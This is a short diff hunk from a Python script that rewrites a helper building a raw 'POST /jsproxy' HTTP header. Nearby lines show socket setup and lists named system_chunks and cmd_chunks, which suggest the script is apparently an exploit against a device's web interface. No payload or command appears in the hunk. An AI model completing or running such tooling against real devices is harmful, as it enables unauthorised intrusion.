@@ -27,7 +27,7 @@ system_chunks = []
 cmd_chunks = []
 
 def makeHeader(num):
-    return bytearray("POST /jsproxy HTTP/1.1\r\nContent-Length: ") + bytearray(str(num)) + bytearray("\r\n\r\n")
+    return bytearray("POST /jsproxy HTTP/1.1\r\nContent-Length: " + str(num) + "\r\n\r\n")
 
 def makeSocket(ip, port):
     s = socket.socket()
